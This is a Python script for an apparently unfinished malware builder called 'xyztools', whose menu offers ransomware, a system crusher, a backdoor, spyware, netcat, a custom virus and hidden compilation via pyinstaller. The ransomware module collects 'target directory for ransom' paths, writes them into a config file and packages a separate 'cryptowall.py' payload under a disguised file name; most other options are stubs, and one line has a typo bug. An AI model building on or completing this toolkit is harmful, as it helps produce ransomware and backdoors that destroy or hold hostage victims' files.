import os
import time
import sys
import socket
import random
from  threading import Thread
import xyzbanner
from Crypto.Cipher import AES
import string
import re
import shutil



#kalo udah jadi, terapkan teknik baru, terus enkrip sourcenya

class xyztools:
    def __init__(self):
        self.startdir = os.getcwd()
        xyzbanner.banner()
        login = {"kevin": "otsuganivek"}
        self.ccn = "cryptoconf.py"
        
    def crypto(self): 
        print("crypto module selected. becareful with it")
        time.sleep(2)
        #create folder output
        folout = str(input("folder output name (or address with name): "))
        filename = str(input("file name: "))
        if (os.access(folout, os.W_OK)) == False:
            os.mkdir(folout)         
        targ1 = []
        #target directory for ransom
        print("for windows, type like C:\\\\")
        while True:
            targ = str(input("target directory (input nothing to finish): "))
            if targ == "":
                break
            targ1.append(targ)
        autorun = str(input("create autorun? Y/n "))
        if autorun.lower() == "y":
            pass
        print("generating configuration file...")   
        with open("cryptoconf.py", "w+") as welcome:
            welcome.write("def target():\n global target\n target = [")
            for a in targ1:
                welcome.write("'" + str(a) + "', ")
            welcome.write("]\n return target")
        print("generating output...")
        required = ["cryptoconf.py", "cryptowall.py"]
        for aa in required:
            os.chdir(self.startdir)
            with open(aa, "rb+") as eko:
                os.chdir(folout)
                with open(aa, "wb+") as oke:                    
                    oke.write(eko.read())
        shutil.move("cryptowall.py", filename)            
        os.chdir(self.startdir)            
                
                
    def cusex(self):
        while True:
         try:
             ip, port = str(input("ip: ")), int(input("port: "))
             break
         except:
             print("invalid input")
             pass
    
    def syscrusher(self):
        try:
            oss = str(input("OS SYSTEM:\n1.Windows\n2.Linux"))
        except:
            pass
        
    def virus(self):
        vname = str("virus name(must be the same after compile with pyinstaller): ")
        yorn = str(input("use your own script or not y/n "))
        if yorn.lower() == "y":
            cusscdir = strI(input("custom script dir: "))
        else:
            pass
    
    def compile(self):
        print('sorry, its not availble yet. try run "pyinstaller" with arg -w -F to run underground')
    def run(self):
        print("1.crypto module\n2.system crusher\n3.system slower\n4.custom backdoor\n5.spyware\n6.netcat\n7.custom virus\n8.banner writer(write cool gravity)\n9.compile python script")
        select = int(input("select: "))
        if select == 1:
            self.crypto()
        if select == 4:
            self.cusex()
        if select == 9:
            self.compile()
            
xyztools().run()